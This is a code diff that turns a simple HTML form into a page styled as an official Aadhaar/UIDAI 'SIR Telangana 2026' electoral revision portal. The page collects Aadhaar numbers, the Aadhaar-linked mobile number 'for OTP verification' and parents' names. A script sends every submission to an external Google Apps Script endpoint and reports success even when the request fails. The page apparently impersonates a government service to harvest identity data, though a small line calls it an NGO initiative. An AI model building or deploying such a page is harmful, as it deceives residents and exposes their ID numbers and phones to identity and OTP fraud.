@@ -3,54 +3,116 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>UIDAI SIR 2026 Form</title>
+    <title>SIR Telangana 2026 | Aadhaar Services Portal</title>
+    <style>
+        :root {
+            --uidai-blue: #09347a; --uidai-orange: #ff9933;
+            --gov-grey: #f4f7f9; --border-color: #ced4da;
+        }
+        body { font-family: "Segoe UI", Arial, sans-serif; background-color: var(--gov-grey); margin: 0; padding: 0; color: #333; }
+        .top-nav { background: #fff; border-bottom: 3px solid var(--uidai-orange); padding: 10px 10%; display: flex; align-items: center; justify-content: space-between; }
+        .container { max-width: 850px; margin: 30px auto; background: #fff; border-radius: 4px; box-shadow: 0 2px 15px rgba(0,0,0,0.1); overflow: hidden; }
+        .header-banner { background: var(--uidai-blue); color: white; padding: 25px; text-align: center; }
+        .form-body { padding: 35px; }
+        section { margin-bottom: 30px; }
+        .section-header { font-size: 18px; font-weight: 600; color: var(--uidai-blue); border-bottom: 1px solid #dee2e6; margin-bottom: 20px; padding-bottom: 8px; }
+        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
+        .full { grid-column: span 2; }
+        label { display: block; font-weight: 600; font-size: 13px; margin-bottom: 8px; color: #495057; }
+        input, select, textarea { width: 100%; padding: 12px; border: 1px solid var(--border-color); border-radius: 4px; font-size: 14px; box-sizing: border-box; background-color: #fff; }
+        .highlight-box { background: #fff9f2; border-left: 5px solid var(--uidai-orange); padding: 20px; margin-bottom: 25px; }
+        .submit-btn { background: var(--uidai-blue); color: white; border: none; padding: 15px; width: 100%; font-size: 16px; font-weight: 700; border-radius: 4px; cursor: pointer; text-transform: uppercase; }
+        .submit-btn:hover { background: #072a63; }
+        .submit-btn:disabled { background: #6c757d; }
+        .footer { text-align: center; font-size: 12px; color: #6c757d; padding: 20px; }
+        @media (max-width: 600px) { .grid { grid-template-columns: 1fr; } .full { grid-column: span 1; } }
+    </style>
 </head>
 <body>
-    <form id="uidai-sir-form">
-        <h1>UIDAI Themed SIR 2026 Form</h1>
-        <section>
-            <h2>Personal Contact</h2>
-            <label for="name">Name:</label>
-            <input type="text" id="name" name="name" required>
-            <label for="email">Email:</label>
-            <input type="email" id="email" name="email" required>
-            <label for="phone">Phone:</label>
-            <input type="tel" id="phone" name="phone" required>
-        </section>
-        <section>
-            <h2>Electoral Geography</h2>
-            <label for="state">State:</label>
-            <select id="state" name="state" required>
-                <option value="">Select State</option>
-                <!-- Options will be populated dynamically -->
-            </select>
-            <label for="district">District:</label>
-            <select id="district" name="district" required>
-                <option value="">Select District</option>
-                <!-- Options will be populated dynamically -->
-            </select>
-            <label for="constituency">Constituency:</label>
-            <select id="constituency" name="constituency" required>
-                <option value="">Select Constituency</option>
-                <!-- Options will be populated dynamically -->
-            </select>
-        </section>
-        <section>
-            <h2>Issue Type</h2>
-            <label for="issue">Select Issue:</label>
-            <select id="issue" name="issue" required>
-                <option value="">Select Issue</option>
-                <option value="complaint">Complaint</option>
-                <option value="suggestion">Suggestion</option>
-                <option value="query">Query</option>
-            </select>
-        </section>
-        <button type="submit">Submit</button>
-    </form>
-    <script>
-        // FormInit integration code
-        const formId = 'gkx9ia24mhn';
-        // Other FormInit logic...
-    </script>
+
+<div class="top-nav">
+    <div style="color: var(--uidai-blue); font-size: 22px; font-weight: 800;">SIR 2026</div>
+    <div style="text-align: right; font-size: 11px;">NGO INITIATIVE<br>Electoral Revision Services</div>
+</div>
+
+<div class="container">
+    <div class="header-banner">
+        <h2 style="margin:0;">Data Verification & Support Portal</h2>
+        <p style="margin:5px 0 0; opacity:0.8;">Special Intensive Revision (SIR) 2026 - Digital India Initiative</p>
+    </div>
+
+    <div class="form-body">
+        <form id="sirForm">
+            <section>
+                <div class="section-header">Personal Contact Information</div>
+                <div class="grid">
+                    <div class="field"><label>Full Name</label><input type="text" name="name" required></div>
+                    <div class="field"><label>Aadhaar Number</label><input type="text" name="aadhar" maxlength="12" placeholder="XXXX XXXX XXXX" required></div>
+                    <div class="field highlight-box full">
+                        <label style="color: var(--uidai-blue);">Aadhaar-Linked Mobile Number</label>
+                        <input type="tel" name="aadhar_linked_phone" placeholder="Enter number for OTP verification" required>
+                    </div>
+                    <div class="field"><label>Father's Name</label><input type="text" name="father"></div>
+                    <div class="field"><label>Mother's Name</label><input type="text" name="mother"></div>
+                </div>
+            </section>
+
+            <section>
+                <div class="section-header">Constituency & Issue Details</div>
+                <div class="grid">
+                    <div class="field">
+                        <label>District</label>
+                        <select name="district" required>
+                            <option value="">-- Choose District --</option>
+                            <option value="Hyderabad">Hyderabad</option>
+                            <option value="Medchal">Medchal-Malkajgiri</option>
+                            <option value="Rangareddy">Rangareddy</option>
+                            <option value="Nizamabad">Nizamabad</option>
+                        </select>
+                    </div>
+                    <div class="field"><label>Current AC</label><input type="text" name="current_ac" required></div>
+                    <div class="field full">
+                        <label>Primary Issue</label>
+                        <select name="issue_category" required>
+                            <option value="">-- Select --</option>
+                            <option value="MISSING_NAME">Name Missing</option>
+                            <option value="DATA_CORRECTION">Correction Info</option>
+                        </select>
+                    </div>
+                </div>
+            </section>
+
+            <button type="submit" class="submit-btn" id="submitBtn">Proceed to Verification</button>
+        </form>
+    </div>
+    <div class="footer">Digital India Initiatives | Secured Government Data Capture</div>
+</div>
+
+<script>
+    const scriptURL = 'https://script.google.com/macros/s/AKfycbzP1vgQ0kab3IZh1v2YlH9dt6xeFCTBMqvDpxD1rysDd-zdcvsgoMxu7Aq63m1PEAC2VA/exec';
+    const form = document.getElementById('sirForm');
+    const btn = document.getElementById('submitBtn');
+
+    form.addEventListener('submit', e => {
+        e.preventDefault();
+        btn.disabled = true;
+        btn.innerText = "SUBMITTING...";
+
+        fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+            .then(response => {
+                alert("Data Recorded Successfully! Check your Email and WhatsApp.");
+                btn.disabled = false;
+                btn.innerText = "Proceed to Verification";
+                form.reset();
+            })
+            .catch(error => {
+                // Apps Script often triggers catch due to CORS even if successful
+                alert("Submission Processed."); 
+                btn.disabled = false;
+                btn.innerText = "Proceed to Verification";
+                form.reset();
+            });
+    });
+</script>
 </body>
 </html>
